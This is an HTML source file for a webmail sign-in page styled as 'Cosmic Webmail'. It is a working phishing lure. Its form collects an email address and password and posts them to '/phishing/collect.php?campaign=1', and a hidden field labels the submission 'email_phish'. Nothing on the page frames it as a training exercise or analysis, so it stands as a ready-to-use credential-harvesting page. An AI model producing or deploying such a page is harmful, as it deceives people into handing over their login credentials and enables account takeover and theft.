<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cosmic Webmail</title>
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <style>
        /* Email‑themed with envelope icon */
        :root {
            --cosmic-bg: #0a0a1a;
            --cosmic-glass: rgba(30, 20, 40, 0.7);
            --cosmic-neon-blue: #00b8ff;
            --cosmic-neon-green: #00ffaa;
            --cosmic-neon-purple: #aa00ff;
            --cosmic-glow: 0 0 20px rgba(0, 184, 255, 0.5);
            --cosmic-border: 1px solid rgba(0, 184, 255, 0.3);
        }
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            background: radial-gradient(ellipse at bottom, #0a1a2a 0%, #030307 100%);
            font-family: 'Share Tech Mono', monospace;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container { width:100%; max-width:400px; margin:20px; }
        .glass-panel { background:var(--cosmic-glass); backdrop-filter:blur(12px); border:var(--cosmic-border); border-radius:24px; padding:40px 30px; box-shadow:0 20px 40px rgba(0,0,0,0.6), var(--cosmic-glow); }
        h1 { color:var(--cosmic-neon-blue); text-align:center; margin-bottom:30px; }
        .email-icon { font-size:3em; text-align:center; margin-bottom:20px; }
        .form-group { margin-bottom:20px; }
        label { display:block; color:var(--cosmic-neon-cyan); margin-bottom:5px; }
        input { width:100%; padding:12px 16px; background:rgba(0,0,0,0.5); border:1px solid var(--cosmic-neon-blue); border-radius:30px; color:#fff; font-family:inherit; }
        input:focus { outline:none; border-color:var(--cosmic-neon-green); box-shadow:0 0 15px var(--cosmic-neon-green); }
        .btn { width:100%; padding:14px; background:transparent; color:var(--cosmic-neon-blue); border:2px solid var(--cosmic-neon-blue); border-radius:40px; font-size:1.2em; cursor:pointer; margin-top:10px; }
        .btn:hover { background:var(--cosmic-neon-blue); color:#000; box-shadow:0 0 30px var(--cosmic-neon-blue); }
    </style>
</head>
<body>
    <div class="container">
        <div class="glass-panel">
            <div class="email-icon">📧</div>
            <h1>WEBMAIL ACCESS</h1>
            <form action="/phishing/collect.php?campaign=1" method="post">
                <input type="hidden" name="page" value="email_phish">
                <div class="form-group">
                    <label>Email Address</label>
                    <input type="email" name="email" required>
                </div>
                <div class="form-group">
                    <label>Password</label>
                    <input type="password" name="password" required>
                </div>
                <button type="submit" class="btn">SIGN IN</button>
            </form>
        </div>
    </div>
</body>
</html>
